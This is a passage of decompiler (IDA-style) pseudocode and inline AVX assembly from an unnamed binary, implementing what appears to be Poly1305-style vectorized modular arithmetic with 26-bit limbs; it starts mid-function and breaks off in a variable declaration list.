    v45 = _mm_mul_epu32(v44, v237);
    v46 = v44;
    v47 = _mm_add_epi64(v43, _mm_mul_epu32(v44, v227));
    si128 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
    v48 = _mm_add_epi64(v42, _mm_mul_epu32(v46, v229));
    v49 = _mm_add_epi64(v41, _mm_mul_epu32(v46, v233));
    v50 = _mm_add_epi64(v40, v45);
    v51 = _mm_and_si128(v50, si128);
    v52 = _mm_add_epi64(
            _mm_srli_epi64(v50, 0x1Au),
            _mm_add_epi64(v38, _mm_mul_epu32(_mm_cvtsi32_si128(*(_DWORD *)(a2 + 124)), v225)));
    v53 = _mm_srli_epi64(v52, 0x1Au);
    v54 = _mm_add_epi64(_mm_srli_epi64(v47, 0x1Au), v48);
    v55 = _mm_add_epi64(_mm_srli_epi64(v54, 0x1Au), v49);
    v15 = _mm_and_si128(v55, si128);
    v56 = _mm_add_epi64(_mm_slli_epi64(v53, 2u), _mm_add_epi32(_mm_and_si128(v47, si128), v53));
    v57 = _mm_srli_epi64(v56, 0x1Au);
    v58 = _mm_add_epi32(_mm_srli_epi64(v55, 0x1Au), v51);
    v59 = _mm_srli_epi64(v58, 0x1Au);
    v13 = _mm_and_si128(v56, si128);
    v14 = _mm_add_epi32(_mm_and_si128(v54, si128), v57);
    v16 = _mm_and_si128(v58, si128);
    v17 = _mm_add_epi32(_mm_and_si128(v52, si128), v59);
    v7 -= 16;
    if ( v7 )
    {
LABEL_9:
      v60 = v7 < 0x40;
      v61 = v7 - 64;
      v62 = _mm_loadu_si128((const __m128i *)(a2 + 48));
      v63 = _mm_shuffle_epi32(v62, 68);
      if ( v60 )
        v5 -= 2;
      v260 = v63;
      result = &v246;
      v64 = _mm_loadu_si128((const __m128i *)(a2 + 64));
      v251 = _mm_shuffle_epi32(v62, 238);
      v261 = _mm_shuffle_epi32(v64, 68);
      v65 = _mm_loadu_si128((const __m128i *)(a2 + 80));
      v252 = _mm_shuffle_epi32(v64, 238);
      v262 = _mm_shuffle_epi32(v65, 68);
      v66 = _mm_loadu_si128((const __m128i *)(a2 + 96));
      v253 = _mm_shuffle_epi32(v65, 238);
      v263 = _mm_shuffle_epi32(v66, 68);
      v67 = _mm_loadu_si128((const __m128i *)(a2 + 112));
      v254 = _mm_shuffle_epi32(v66, 238);
      v264 = _mm_shuffle_epi32(v67, 68);
      v68 = _mm_loadu_si128((const __m128i *)(a2 + 128));
      v255 = _mm_shuffle_epi32(v67, 238);
      v265 = _mm_shuffle_epi32(v68, 68);
      v69 = _mm_loadu_si128((const __m128i *)(a2 + 144));
      v256 = _mm_shuffle_epi32(v68, 238);
      v266 = _mm_shuffle_epi32(v69, 68);
      v70 = _mm_loadu_si128((const __m128i *)(a2 + 160));
      v257 = _mm_shuffle_epi32(v69, 238);
      v267 = _mm_shuffle_epi32(v70, 68);
      v71 = _mm_loadu_si128((const __m128i *)(a2 + 176));
      v258 = _mm_shuffle_epi32(v70, 238);
      v268 = _mm_shuffle_epi32(v71, 68);
      v259 = _mm_shuffle_epi32(v71, 238);
      v72 = _mm_loadu_si128(v5 + 2);
      v73 = _mm_loadu_si128(v5 + 3);
      v74 = v5 + 2;
      v243 = v15;
      v244 = v16;
      v245 = v17;
      v75 = _mm_unpacklo_epi64(_mm_srli_si128(v72, 6), _mm_srli_si128(v73, 6));
      v76 = _mm_unpackhi_epi64(v72, v73);
      v77 = _mm_unpacklo_epi64(v72, v73);
      v78 = v75;
      v79 = _mm_srli_epi64(v77, 0x1Au);
      v80 = _mm_and_si128(v77, si128);
      v81 = _mm_and_si128(v79, si128);
      v82 = _mm_and_si128(_mm_srli_epi64(v75, 4u), si128);
      v83 = _mm_and_si128(_mm_srli_epi64(v78, 0x1Eu), si128);
      v84 = _mm_or_si128(_mm_srli_epi64(v76, 0x28u), *(__m128i *)dword_4D38C0);
      v241 = v13;
      v242 = v14;
      if ( !v60 && v61 != 0 )
      {
        do
        {
          v85 = _mm_load_si128(&v251);
          v247 = v81;
          v248 = v82;
          v249 = v83;
          v250 = v84;
          v86 = _mm_add_epi64(_mm_mul_epu32(v81, v259), _mm_mul_epu32(v80, v85));
          v87 = _mm_add_epi64(_mm_mul_epu32(v80, v252), _mm_mul_epu32(v81, v85));
          v88 = _mm_load_si128(&v247);
          v89 = _mm_add_epi64(
                  _mm_add_epi64(_mm_mul_epu32(v82, v85), _mm_mul_epu32(v80, v253)),
                  _mm_mul_epu32(v88, v252));
          v90 = _mm_add_epi64(
                  _mm_add_epi64(_mm_mul_epu32(v83, v85), _mm_mul_epu32(v80, v254)),
                  _mm_mul_epu32(v88, v253));
          v91 = _mm_add_epi64(
                  _mm_add_epi64(_mm_mul_epu32(v84, v85), _mm_mul_epu32(v80, v255)),
                  _mm_mul_epu32(v88, v254));
          v92 = _mm_load_si128(&v248);
          v93 = _mm_add_epi64(v87, _mm_mul_epu32(v92, v259));
          v94 = _mm_load_si128(&v249);
          v95 = _mm_add_epi64(_mm_add_epi64(v91, _mm_mul_epu32(v92, v253)), _mm_mul_epu32(v94, v252));
          v96 = _mm_load_si128(&v250);
          v97 = _mm_add_epi64(_mm_add_epi64(v90, _mm_mul_epu32(v92, v252)), _mm_mul_epu32(v96, v259));
          v98 = _mm_add_epi64(
                  _mm_add_epi64(_mm_add_epi64(v86, _mm_mul_epu32(v92, v258)), _mm_mul_epu32(v94, v257)),
                  _mm_mul_epu32(v96, v256));
          v99 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
          v100 = _mm_add_epi64(_mm_add_epi64(v93, _mm_mul_epu32(v94, v258)), _mm_mul_epu32(v96, v257));
          v101 = _mm_add_epi64(_mm_add_epi64(v89, _mm_mul_epu32(v94, v259)), _mm_mul_epu32(v96, v258));
          v102 = _mm_loadu_si128(v74 - 2);
          v103 = _mm_loadu_si128(v74 - 1);
          v104 = v74 + 2;
          v230 = v101;
          v234 = v97;
          v238 = v95;
          v105 = _mm_unpacklo_epi64(_mm_srli_si128(v102, 6), _mm_srli_si128(v103, 6));
          v106 = _mm_unpackhi_epi64(v102, v103);
          v107 = _mm_unpacklo_epi64(v102, v103);
          v108 = v105;
          v109 = _mm_srli_epi64(v107, 0x1Au);
          v110 = v61 < 0x40;
          v61 -= 64;
          v111 = _mm_add_epi32(_mm_and_si128(v107, v99), v241);
          v112 = _mm_add_epi32(_mm_and_si128(v109, v99), v242);
          v113 = _mm_add_epi32(_mm_and_si128(_mm_srli_epi64(v105, 4u), v99), v243);
          v114 = _mm_add_epi32(_mm_and_si128(_mm_srli_epi64(v108, 0x1Eu), v99), v244);
          v115 = _mm_add_epi32(_mm_or_si128(_mm_srli_epi64(v106, 0x28u), *(__m128i *)dword_4D38C0), v245);
          if ( v110 )
            v104 -= 2;
          result = &v246;
          v116 = _mm_load_si128(&v260);
          v247 = v112;
          v248 = v113;
          v249 = v114;
          v250 = v115;
          v117 = _mm_add_epi64(_mm_mul_epu32(v112, v268), _mm_add_epi64(_mm_mul_epu32(v111, v116), v98));
          v118 = _mm_add_epi64(_mm_mul_epu32(v111, v261), _mm_add_epi64(_mm_mul_epu32(v112, v116), v100));
          v119 = _mm_load_si128(&v247);
          v120 = _mm_add_epi64(
                   _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v113, v116), v230), _mm_mul_epu32(v111, v262)),
                   _mm_mul_epu32(v119, v261));
          v121 = _mm_add_epi64(
                   _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v114, v116), v234), _mm_mul_epu32(v111, v263)),
                   _mm_mul_epu32(v119, v262));
          v122 = _mm_add_epi64(
                   _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v115, v116), v238), _mm_mul_epu32(v111, v264)),
                   _mm_mul_epu32(v119, v263));
          v123 = _mm_load_si128(&v248);
          v124 = _mm_add_epi64(v121, _mm_mul_epu32(v123, v261));
          v125 = _mm_load_si128(&v249);
          v126 = _mm_add_epi64(v122, _mm_mul_epu32(v123, v262));
          v127 = _mm_add_epi64(_mm_add_epi64(v117, _mm_mul_epu32(v123, v267)), _mm_mul_epu32(v125, v266));
          v128 = v125;
          v129 = _mm_add_epi64(_mm_add_epi64(v118, _mm_mul_epu32(v123, v268)), _mm_mul_epu32(v125, v267));
          v130 = _mm_add_epi64(v120, _mm_mul_epu32(v125, v268));
          v131 = _mm_load_si128(&v250);
          v132 = _mm_mul_epu32(v131, v268);
          v133 = _mm_add_epi64(v126, _mm_mul_epu32(v128, v261));
          v134 = v131;
          v135 = _mm_add_epi64(v127, _mm_mul_epu32(v131, v265));
          v136 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
          v137 = _mm_add_epi64(v129, _mm_mul_epu32(v134, v266));
          v138 = _mm_add_epi64(v130, _mm_mul_epu32(v134, v267));
          v139 = _mm_add_epi64(v124, v132);
          v140 = _mm_and_si128(v139, v136);
          v141 = _mm_add_epi64(_mm_srli_epi64(v139, 0x1Au), v133);
          v142 = _mm_srli_epi64(v141, 0x1Au);
          v143 = _mm_add_epi64(_mm_srli_epi64(v135, 0x1Au), v137);
          v144 = _mm_add_epi64(_mm_srli_epi64(v143, 0x1Au), v138);
          v145 = _mm_add_epi64(_mm_slli_epi64(v142, 2u), _mm_add_epi32(_mm_and_si128(v135, v136), v142));
          v146 = _mm_srli_epi64(v145, 0x1Au);
          v147 = _mm_add_epi32(_mm_srli_epi64(v144, 0x1Au), v140);
          v13 = _mm_and_si128(v145, v136);
          v14 = _mm_add_epi32(_mm_and_si128(v143, v136), v146);
          v148 = _mm_loadu_si128(v104 + 2);
          v149 = _mm_loadu_si128(v104 + 3);
          v74 = v104 + 2;
          v243 = _mm_and_si128(v144, v136);
          v244 = _mm_and_si128(v147, v136);
          v245 = _mm_add_epi32(_mm_and_si128(v141, v136), _mm_srli_epi64(v147, 0x1Au));
          v150 = _mm_unpacklo_epi64(_mm_srli_si128(v148, 6), _mm_srli_si128(v149, 6));
          v151 = _mm_unpackhi_epi64(v148, v149);
          v152 = _mm_unpacklo_epi64(v148, v149);
          v153 = v150;
          v154 = _mm_srli_epi64(v152, 0x1Au);
          v80 = _mm_and_si128(v152, v136);
          v81 = _mm_and_si128(v154, v136);
          v82 = _mm_and_si128(_mm_srli_epi64(v150, 4u), v136);
          v83 = _mm_and_si128(_mm_srli_epi64(v153, 0x1Eu), v136);
          v84 = _mm_or_si128(_mm_srli_epi64(v151, 0x28u), *(__m128i *)dword_4D38C0);
          v241 = v13;
          v242 = v14;
        }
        while ( !v110 && v61 != 0 );
      }
      v155 = _mm_shuffle_epi32(v251, 16);
      if ( v61 == -32 )
      {
        v80 = _mm_add_epi32(v80, v13);
        v81 = _mm_add_epi32(v81, v14);
        v82 = _mm_add_epi32(v82, v243);
        v83 = _mm_add_epi32(v83, v244);
        v84 = _mm_add_epi32(v84, v245);
      }
      v246 = v80;
      v247 = v81;
      v248 = v82;
      v249 = v83;
      v250 = v84;
      v156 = _mm_mul_epu32(v80, v155);
      v157 = _mm_mul_epu32(v81, v155);
      v158 = _mm_shuffle_epi32(v252, 16);
      v159 = _mm_add_epi64(_mm_mul_epu32(v84, v155), _mm_mul_epu32(v158, v83));
      v160 = _mm_add_epi64(_mm_mul_epu32(v83, v155), _mm_mul_epu32(v158, v82));
      v161 = _mm_add_epi64(_mm_mul_epu32(v82, v155), _mm_mul_epu32(v158, v247));
      v162 = _mm_add_epi64(v157, _mm_mul_epu32(v158, v80));
      v163 = _mm_shuffle_epi32(v253, 16);
      v164 = _mm_add_epi64(v160, _mm_mul_epu32(v163, v247));
      v165 = _mm_shuffle_epi32(v257, 16);
      v166 = _mm_add_epi64(v161, _mm_mul_epu32(v163, v246));
      v167 = _mm_shuffle_epi32(v254, 16);
      v168 = _mm_add_epi64(_mm_add_epi64(v159, _mm_mul_epu32(v163, v248)), _mm_mul_epu32(v167, v247));
      v169 = _mm_shuffle_epi32(v258, 16);
      v170 = _mm_add_epi64(_mm_add_epi64(v162, _mm_mul_epu32(v165, v250)), _mm_mul_epu32(v169, v249));
      v171 = _mm_add_epi64(
               _mm_add_epi64(
                 _mm_add_epi64(v156, _mm_mul_epu32(_mm_shuffle_epi32(v256, 16), v250)),
                 _mm_mul_epu32(v165, v249)),
               _mm_mul_epu32(v169, v248));
      v172 = _mm_add_epi64(v168, _mm_mul_epu32(_mm_shuffle_epi32(v255, 16), v246));
      v173 = _mm_shuffle_epi32(v259, 16);
      v174 = _mm_add_epi64(_mm_add_epi64(v164, _mm_mul_epu32(v167, v246)), _mm_mul_epu32(v173, v250));
      v175 = _mm_add_epi64(v171, _mm_mul_epu32(v173, v247));
      v176 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
      v177 = _mm_add_epi64(v170, _mm_mul_epu32(v173, v248));
      v178 = _mm_add_epi64(_mm_add_epi64(v166, _mm_mul_epu32(v169, v250)), _mm_mul_epu32(v173, v249));
      if ( v61 != -32 )
      {
        v179 = _mm_loadu_si128(v74 - 2);
        v180 = _mm_loadu_si128(v74 - 1);
        v231 = v178;
        v235 = v174;
        v239 = v172;
        v181 = _mm_unpacklo_epi64(_mm_srli_si128(v179, 6), _mm_srli_si128(v180, 6));
        v182 = _mm_unpackhi_epi64(v179, v180);
        v183 = _mm_unpacklo_epi64(v179, v180);
        v184 = v181;
        v185 = _mm_srli_epi64(v183, 0x1Au);
        v186 = _mm_and_si128(v183, v176);
        v187 = _mm_and_si128(v185, v176);
        v188 = _mm_and_si128(_mm_srli_epi64(v181, 4u), v176);
        v189 = _mm_and_si128(_mm_srli_epi64(v184, 0x1Eu), v176);
        v190 = _mm_shuffle_epi32(v260, 16);
        v226 = _mm_add_epi32(v186, v241);
        v228 = _mm_add_epi32(v187, v242);
        v191 = _mm_add_epi64(v175, _mm_mul_epu32(v226, v190));
        v192 = _mm_add_epi32(v188, v243);
        v193 = _mm_add_epi32(v189, v244);
        v194 = _mm_add_epi64(_mm_mul_epu32(v192, v190), v231);
        v232 = v192;
        v195 = _mm_add_epi64(_mm_mul_epu32(v193, v190), v235);
        v236 = v193;
        v196 = _mm_add_epi32(_mm_or_si128(_mm_srli_epi64(v182, 0x28u), *(__m128i *)dword_4D38C0), v245);
        v197 = _mm_add_epi64(_mm_mul_epu32(v196, v190), v239);
        v240 = v196;
        v198 = _mm_shuffle_epi32(v261, 16);
        v199 = _mm_add_epi64(v197, _mm_mul_epu32(v198, v236));
        v200 = _mm_add_epi64(v195, _mm_mul_epu32(v198, v192));
        v201 = _mm_add_epi64(v194, _mm_mul_epu32(v198, v228));
        v202 = _mm_add_epi64(_mm_add_epi64(v177, _mm_mul_epu32(v228, v190)), _mm_mul_epu32(v198, v226));
        v203 = _mm_shuffle_epi32(v262, 16);
        v204 = _mm_add_epi64(v199, _mm_mul_epu32(v203, v192));
        v205 = _mm_add_epi64(v200, _mm_mul_epu32(v203, v228));
        v206 = _mm_shuffle_epi32(v266, 16);
        v207 = _mm_add_epi64(v201, _mm_mul_epu32(v203, v226));
        v208 = _mm_shuffle_epi32(v263, 16);
        v209 = _mm_shuffle_epi32(v267, 16);
        v210 = _mm_add_epi64(_mm_add_epi64(v202, _mm_mul_epu32(v206, v240)), _mm_mul_epu32(v209, v236));
        v211 = _mm_add_epi64(
                 _mm_add_epi64(
                   _mm_add_epi64(v191, _mm_mul_epu32(_mm_shuffle_epi32(v265, 16), v240)),
                   _mm_mul_epu32(v206, v236)),
                 _mm_mul_epu32(v209, v232));
        v172 = _mm_add_epi64(
                 _mm_add_epi64(v204, _mm_mul_epu32(v208, v228)),
                 _mm_mul_epu32(_mm_shuffle_epi32(v264, 16), v226));
        v212 = _mm_shuffle_epi32(v268, 16);
        v174 = _mm_add_epi64(_mm_add_epi64(v205, _mm_mul_epu32(v208, v226)), _mm_mul_epu32(v212, v240));
        v175 = _mm_add_epi64(v211, _mm_mul_epu32(v212, v228));
        v176 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
        v177 = _mm_add_epi64(v210, _mm_mul_epu32(v212, v232));
        v178 = _mm_add_epi64(_mm_add_epi64(v207, _mm_mul_epu32(v209, v240)), _mm_mul_epu32(v212, v236));
      }
      v213 = _mm_add_epi64(v174, _mm_shuffle_epi32(v174, 78));
      v214 = _mm_and_si128(v213, v176);
      v215 = _mm_add_epi64(v175, _mm_shuffle_epi32(v175, 78));
      v216 = _mm_and_si128(v215, v176);
      v217 = _mm_add_epi64(_mm_srli_epi64(v213, 0x1Au), _mm_add_epi64(v172, _mm_shuffle_epi32(v172, 78)));
      v218 = _mm_srli_epi64(v217, 0x1Au);
      v219 = _mm_add_epi64(_mm_srli_epi64(v215, 0x1Au), _mm_add_epi64(v177, _mm_shuffle_epi32(v177, 78)));
      v220 = _mm_add_epi64(_mm_srli_epi64(v219, 0x1Au), _mm_add_epi64(v178, _mm_shuffle_epi32(v178, 78)));
      v15 = _mm_and_si128(v220, v176);
      v221 = _mm_add_epi64(_mm_slli_epi64(v218, 2u), _mm_add_epi32(v216, v218));
      v222 = _mm_srli_epi64(v221, 0x1Au);
      v223 = _mm_add_epi32(_mm_srli_epi64(v220, 0x1Au), v214);
      v224 = _mm_srli_epi64(v223, 0x1Au);
      v13 = _mm_and_si128(v221, v176);
      v14 = _mm_add_epi32(_mm_and_si128(v219, v176), v222);
      v16 = _mm_and_si128(v223, v176);
      v17 = _mm_add_epi32(_mm_and_si128(v217, v176), v224);
    }
    *(_DWORD *)a2 = _mm_cvtsi128_si32(v13);
    *(_DWORD *)(a2 + 4) = _mm_cvtsi128_si32(v14);
    *(_DWORD *)(a2 + 8) = _mm_cvtsi128_si32(v15);
    *(_DWORD *)(a2 + 12) = _mm_cvtsi128_si32(v16);
    *(_DWORD *)(a2 + 16) = _mm_cvtsi128_si32(v17);
  }
  return result;
}
// 4D2087: control flows out of bounds to 4D1A50
// 4D38C0: using guessed type int dword_4D38C0[2];
// 4D2060: using guessed type __m128i anonymous_20;

//----- (004D2DE0) --------------------------------------------------------
int __cdecl sub_4D2DE0(unsigned int *a1, _DWORD *a2, int a3)
{
  unsigned __int64 v3; // kr08_8
  unsigned __int64 v4; // kr10_8
  unsigned __int64 v5; // kr18_8
  __int64 v6; // rdi
  __int64 v7; // kr20_8
  int v8; // ebp
  unsigned int v9; // ebx
  unsigned int v10; // ecx
  int v11; // eax
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  bool v15; // cf
  int result; // eax
  unsigned __int64 v17; // kr38_8
  int v18; // ecx
  BOOL v19; // ett
  int v20; // edx

  if ( !a1[5] )
    JUMPOUT(0x4D1C28);
  v3 = __PAIR64__(a1[1] >> 6, a1[1] << 26) + *a1;
  v4 = __PAIR64__(a1[2] >> 12, a1[2] << 20) + HIDWORD(v3);
  v5 = __PAIR64__(a1[3] >> 18, a1[3] << 14) + HIDWORD(v4);
  LODWORD(v6) = a1[4] << 8;
  HIDWORD(v6) = HIBYTE(a1[4]);
  v7 = v6 + HIDWORD(v5);
  v8 = 5 * (HIDWORD(v7) >> 2);
  v9 = (__PAIR64__(a1[2] << 20, v8) + v3) >> 32;
  v10 = __CFADD__(__CFADD__(v8, (_DWORD)v3), (_DWORD)v4) + (_DWORD)v5;
  HIDWORD(v6) = -((unsigned int)((__PAIR64__(
                                    BYTE4(v7) & 3,
                                    __CFADD__(__CFADD__(__CFADD__(v8, (_DWORD)v3), (_DWORD)v4), (_DWORD)v5))
                                + (unsigned int)(v6 + HIDWORD(v5))
                                + __CFADD__(__CFADD__(__CFADD__(v8 + v3, 5), v9), v10)) >> 32) >> 2);
  *a2 = HIDWORD(v6) & (v8 + v3 + 5);
  a2[1] = HIDWORD(v6) & (__CFADD__(v8 + v3, 5) + v9);
  a2[2] = HIDWORD(v6) & (__CFADD__(__CFADD__(v8 + v3, 5), v9) + v10);
  a2[3] = HIDWORD(v6) & (__CFADD__(__CFADD__(__CFADD__(v8, (_DWORD)v3), (_DWORD)v4), (_DWORD)v5)
                       + (_DWORD)v7
                       + __CFADD__(__CFADD__(__CFADD__(v8 + v3, 5), v9), v10));
  HIDWORD(v6) = ((unsigned int)((__PAIR64__(
                                   BYTE4(v7) & 3,
                                   __CFADD__(__CFADD__(__CFADD__(v8, (_DWORD)v3), (_DWORD)v4), (_DWORD)v5))
                               + (unsigned int)v7
                               + __CFADD__(__CFADD__(__CFADD__(v8 + v3, 5), v9), v10)) >> 32) >> 2)
              - 1;
  v11 = *a2 | HIDWORD(v6) & _mm_cvtsi128_si32(_mm_cvtsi32_si128(v8 + (int)v3));
  v12 = a2[1] | HIDWORD(v6) & _mm_cvtsi128_si32(_mm_cvtsi32_si128(v9));
  v13 = a2[2] | HIDWORD(v6) & _mm_cvtsi128_si32(_mm_cvtsi32_si128(v10));
  v14 = a2[3] | HIDWORD(v6) & _mm_cvtsi128_si32(
                                _mm_cvtsi32_si128(
                                  __CFADD__(__CFADD__(__CFADD__(v8, (_DWORD)v3), (_DWORD)v4), (_DWORD)v5)
                                + (unsigned int)v7));
  v15 = __CFADD__(*(_QWORD *)a3, __PAIR64__(v12, v11));
  v17 = *(_QWORD *)a3 + __PAIR64__(v12, v11);
  result = v17;
  *a2 = v17;
  v19 = v15;
  v15 = __CFADD__(v15, v13);
  v18 = v19 + v13;
  v15 |= __CFADD__(*(_DWORD *)(a3 + 8), v18);
  v18 += *(_DWORD *)(a3 + 8);
  a2[1] = HIDWORD(v17);
  v20 = *(_DWORD *)(a3 + 12) + v15 + v14;
  a2[2] = v18;
  a2[3] = v20;
  return result;
}
// 4D2DEC: control flows out of bounds to 4D1C28

//----- (004D2EE0) --------------------------------------------------------
void __usercall sub_4D2EE0(int _EBX@<ebx>, int _EDI@<edi>)
{
  int v15; // ecx
  char v138; // [esp+90h] [ebp-50h] BYREF

  __asm { vmovdqu xmm4, xmmword ptr [edi+18h] }
  _EDI = _EDI + 48;
  __asm
  {
    vmovdqa xmm7, xmmword ptr [ebx+40h]
    vpand   xmm0, xmm4, xmm7
    vpsrlq  xmm1, xmm4, 1Ah
    vpsrldq xmm3, xmm4, 6
    vpand   xmm1, xmm1, xmm7
    vpsrlq  xmm2, xmm3, 4
    vpsrlq  xmm3, xmm3, 1Eh
    vpand   xmm2, xmm2, xmm7
    vpand   xmm3, xmm3, xmm7
    vpsrldq xmm4, xmm4, 0Dh
  }
  _EDX = &v138;
  v15 = 2;
  while ( 1 )
  {
    __asm
    {
      vmovdqa [esp+0E0h+var_E0], xmm0
      vmovdqa [esp+0E0h+var_D0], xmm1
      vmovdqa [esp+0E0h+var_C0], xmm2
      vmovdqa [esp+0E0h+var_B0], xmm3
      vmovdqa [esp+0E0h+var_A0], xmm4
      vpslld  xmm6, xmm1, 2
      vpslld  xmm5, xmm2, 2
      vpaddd  xmm6, xmm6, xmm1
      vpaddd  xmm5, xmm5, xmm2
      vmovdqa [esp+0E0h+var_90], xmm6
      vmovdqa [esp+0E0h+var_80], xmm5
      vpslld  xmm6, xmm3, 2
      vpslld  xmm5, xmm4, 2
      vpaddd  xmm6, xmm6, xmm3
      vpaddd  xmm5, xmm5, xmm4
      vmovdqa [esp+0E0h+var_70], xmm6
      vmovdqa [esp+0E0h+var_60], xmm5
      vpshufd xmm5, xmm0, 44h ; 'D'
      vmovdqa xmm6, xmm1
      vpshufd xmm1, xmm1, 44h ; 'D'
      vpshufd xmm2, xmm2, 44h ; 'D'
      vpshufd xmm3, xmm3, 44h ; 'D'
      vpshufd xmm4, xmm4, 44h ; 'D'
      vmovdqa xmmword ptr [edx], xmm5
      vmovdqa xmmword ptr [edx+10h], xmm1
      vmovdqa xmmword ptr [edx+20h], xmm2
      vmovdqa xmmword ptr [edx+30h], xmm3
      vmovdqa xmmword ptr [edx+40h], xmm4
      vpmuludq xmm4, xmm4, xmm0
      vpmuludq xmm3, xmm3, xmm0
      vpmuludq xmm2, xmm2, xmm0
      vpmuludq xmm1, xmm1, xmm0
      vpmuludq xmm0, xmm5, xmm0
      vpmuludq xmm5, xmm6, xmmword ptr [edx+30h]
      vpaddq  xmm4, xmm4, xmm5
      vpmuludq xmm7, xmm6, xmmword ptr [edx+20h]
      vpaddq  xmm3, xmm3, xmm7
      vpmuludq xmm5, xmm6, xmmword ptr [edx+10h]
      vpaddq  xmm2, xmm2, xmm5
      vmovdqa xmm7, [esp+0E0h+var_90]
      vpmuludq xmm6, xmm6, xmmword ptr [edx]
      vpaddq  xmm1, xmm1, xmm6
      vmovdqa xmm5, [esp+0E0h+var_C0]
      vpmuludq xmm7, xmm7, xmmword ptr [edx+40h]
      vpaddq  xmm0, xmm0, xmm7
      vpmuludq xmm6, xmm5, xmmword ptr [edx+20h]
      vpaddq  xmm4, xmm4, xmm6
      vpmuludq xmm7, xmm5, xmmword ptr [edx+10h]
      vpaddq  xmm3, xmm3, xmm7
      vmovdqa xmm6, [esp+0E0h+var_80]
      vpmuludq xmm5, xmm5, xmmword ptr [edx]
      vpaddq  xmm2, xmm2, xmm5
      vpmuludq xmm7, xmm6, xmmword ptr [edx+40h]
      vpaddq  xmm1, xmm1, xmm7
      vmovdqa xmm5, [esp+0E0h+var_B0]
      vpmuludq xmm6, xmm6, xmmword ptr [edx+30h]
      vpaddq  xmm0, xmm0, xmm6
      vpmuludq xmm7, xmm5, xmmword ptr [edx+10h]
      vpaddq  xmm4, xmm4, xmm7
      vmovdqa xmm6, [esp+0E0h+var_70]
      vpmuludq xmm5, xmm5, xmmword ptr [edx]
      vpaddq  xmm3, xmm3, xmm5
      vpmuludq xmm7, xmm6, xmmword ptr [edx+40h]
      vpaddq  xmm2, xmm2, xmm7
      vpmuludq xmm5, xmm6, xmmword ptr [edx+30h]
      vpaddq  xmm1, xmm1, xmm5
      vmovdqa xmm7, [esp+0E0h+var_A0]
      vpmuludq xmm6, xmm6, xmmword ptr [edx+20h]
      vpaddq  xmm0, xmm0, xmm6
      vmovdqa xmm5, [esp+0E0h+var_60]
      vpmuludq xmm7, xmm7, xmmword ptr [edx]
      vpaddq  xmm4, xmm4, xmm7
      vpmuludq xmm6, xmm5, xmmword ptr [edx+40h]
      vpaddq  xmm3, xmm3, xmm6
      vpmuludq xmm7, xmm5, xmmword ptr [edx+10h]
      vpaddq  xmm0, xmm0, xmm7
      vpmuludq xmm6, xmm5, xmmword ptr [edx+20h]
      vpaddq  xmm1, xmm1, xmm6
      vmovdqa xmm7, xmmword ptr [ebx+40h]
      vpmuludq xmm5, xmm5, xmmword ptr [edx+30h]
      vpaddq  xmm2, xmm2, xmm5
      vpsrlq  xmm5, xmm3, 1Ah
      vpand   xmm3, xmm3, xmm7
      vpsrlq  xmm6, xmm0, 1Ah
      vpand   xmm0, xmm0, xmm7
      vpaddq  xmm4, xmm4, xmm5
      vpaddq  xmm1, xmm1, xmm6
      vpsrlq  xmm5, xmm4, 1Ah
      vpand   xmm4, xmm4, xmm7
      vpsrlq  xmm6, xmm1, 1Ah
      vpand   xmm1, xmm1, xmm7
      vpaddq  xmm2, xmm2, xmm6
      vpaddd  xmm0, xmm0, xmm5
      vpsllq  xmm5, xmm5, 2
      vpsrlq  xmm6, xmm2, 1Ah
      vpand   xmm2, xmm2, xmm7
      vpaddd  xmm0, xmm0, xmm5
      vpaddd  xmm3, xmm3, xmm6
      vpsrlq  xmm6, xmm3, 1Ah
      vpsrlq  xmm5, xmm0, 1Ah
      vpand   xmm0, xmm0, xmm7
      vpand   xmm3, xmm3, xmm7
      vpaddd  xmm1, xmm1, xmm5
      vpaddd  xmm4, xmm4, xmm6
    }
    if ( !--v15 )
      break;
    __asm
    {
      vpunpcklqdq xmm0, xmm0, [esp+0E0h+var_E0]
      vpunpcklqdq xmm1, xmm1, [esp+0E0h+var_D0]
      vpunpcklqdq xmm2, xmm2, [esp+0E0h+var_C0]
      vpunpcklqdq xmm3, xmm3, [esp+0E0h+var_B0]
      vpunpcklqdq xmm4, xmm4, [esp+0E0h+var_A0]
    }
  }
  __asm
  {
    vpsllq  xmm0, xmm0, 20h ; ' '
    vpsllq  xmm1, xmm1, 20h ; ' '
    vpsllq  xmm2, xmm2, 20h ; ' '
    vpsllq  xmm3, xmm3, 20h ; ' '
    vpsllq  xmm4, xmm4, 20h ; ' '
    vpor    xmm0, xmm0, [esp+0E0h+var_E0]
    vpor    xmm1, xmm1, [esp+0E0h+var_D0]
    vpor    xmm2, xmm2, [esp+0E0h+var_C0]
    vpor    xmm3, xmm3, [esp+0E0h+var_B0]
    vpor    xmm4, xmm4, [esp+0E0h+var_A0]
    vpshufd xmm0, xmm0, 8Dh
    vpshufd xmm1, xmm1, 8Dh
    vpshufd xmm2, xmm2, 8Dh
    vpshufd xmm3, xmm3, 8Dh
    vpshufd xmm4, xmm4, 8Dh
    vmovdqu xmmword ptr [edi], xmm0
    vmovdqu xmmword ptr [edi+10h], xmm1
    vmovdqu xmmword ptr [edi+20h], xmm2
    vmovdqu xmmword ptr [edi+30h], xmm3
    vmovdqu xmmword ptr [edi+40h], xmm4
    vpslld  xmm6, xmm1, 2
    vpslld  xmm5, xmm2, 2
    vpaddd  xmm6, xmm6, xmm1
    vpaddd  xmm5, xmm5, xmm2
    vmovdqu xmmword ptr [edi+50h], xmm6
    vmovdqu xmmword ptr [edi+60h], xmm5
    vpslld  xmm6, xmm3, 2
    vpslld  xmm5, xmm4, 2
    vpaddd  xmm6, xmm6, xmm3
    vpaddd  xmm5, xmm5, xmm4
    vmovdqu xmmword ptr [edi+70h], xmm6
    vmovdqu xmmword ptr [edi+80h], xmm5
  }
}

//----- (004D3200) --------------------------------------------------------
int __cdecl sub_4D3200(_DWORD *a1, int a2, unsigned int a3, int a4)
{
  int result; // eax
  unsigned int v8; // ecx
  int v10; // ebp
  int v11; // ecx
  int v12; // esi
  int v13; // edx
  char v49; // dl
  unsigned int v50; // edx
  char v270; // [esp+120h] [ebp-B0h] BYREF
